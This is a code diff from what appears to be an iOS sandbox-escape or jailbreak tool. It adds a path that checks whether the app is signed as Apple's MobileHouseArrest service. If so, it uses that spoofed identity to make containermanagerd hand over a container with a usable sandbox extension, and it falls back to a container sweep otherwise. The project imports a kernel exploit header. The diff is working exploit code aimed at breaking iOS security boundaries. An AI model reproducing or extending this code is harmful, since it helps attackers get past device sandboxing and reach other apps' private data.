@@ -12,6 +12,7 @@
 #import "Vendor/kexploit_opa334.h"
 #import "Vendor/kutils.h"
 #import "FFPathleak.h"
+#import "Vendor/mcm_bridge.h"
 
 #import <errno.h>
 
@@ -136,6 +137,18 @@ static NSRecursiveLock *FFSandboxOperationLock(void) {
 
 #pragma mark - Grants
 
+BOOL FFSandboxHostIsMobileHouseArrest(void) {
+    static BOOL isMHA;
+    static dispatch_once_t onceToken;
+    dispatch_once(&onceToken, ^{
+        isMHA = [[[NSBundle mainBundle] bundleIdentifier]
+            isEqualToString:@"com.apple.mobile.MobileHouseArrest"];
+        FFLog(@"sandbox: bundle id %@ (%@)", [NSBundle mainBundle].bundleIdentifier ?: @"?",
+              isMHA ? @"MHA-C2 habilitado" : @"sem identidade MHA");
+    });
+    return isMHA;
+}
+
 NSString *FFSandboxAppGroup(void) {
     return worse_query_app_group();
 }
@@ -245,11 +258,30 @@ static BOOL FFSandboxProbeUncached(void) {
             return sandbox_access_is_active() == 1;
 
         case FFSandboxBackendBadQuery: {
-            // bad_query reaches /var/mobile/Containers/Data/Application/<uuid>
-            // but NOT the Application directory itself (the daemon matches but
-            // refuses to mint a token → -4). So the probe grants a real
-            // container: the UUID list comes from the fsgetpath walk, which
-            // needs no token.
+            // 3105's recipe: the app is signed as com.apple.mobile.MobileHouseArrest,
+            // so containermanagerd trusts it and the MHA-C2 activation returns
+            // the container with a usable extension. Probe that first; only if
+            // the identity is missing fall back to the container sweep.
+            if (FFSandboxHostIsMobileHouseArrest()) {
+                NSString *mcmError = nil;
+                NSString *ownContainer = MCMActivateContainerPath(
+                    2, @"com.apple.mobile.MobileHouseArrest", NO, &mcmError);
+                if (ownContainer.length > 0) {
+                    int64_t handle = FFSandboxGrantPath(ownContainer, NO, NULL);
+                    if (handle >= 0 || FFSandboxCurrentBackend() == FFSandboxBackendKernel) {
+                        if (handle >= 0) FFSandboxReleaseHandle(handle);
+                        FFLog(@"sandbox: bad_query ativo via MHA-C2 (%@)", ownContainer.lastPathComponent);
+                        return YES;
+                    }
+                    // MHA activated but no explicit token: the lease itself is
+                    // the grant, so treat activation as success and log it.
+                    if ([[NSFileManager defaultManager] fileExistsAtPath:ownContainer]) {
+                        FFLog(@"sandbox: MHA-C2 lease ativo (%@)", mcmError ?: @"sem erro");
+                        return YES;
+                    }
+                }
+                FFLog(@"sandbox: MHA-C2 indisponível (%@)", mcmError ?: @"sem detalhe");
+            }
             static NSString *cachedContainer;
             if (cachedContainer.length > 0) {
                 int64_t handle = FFSandboxGrantPath(cachedContainer, NO, NULL);
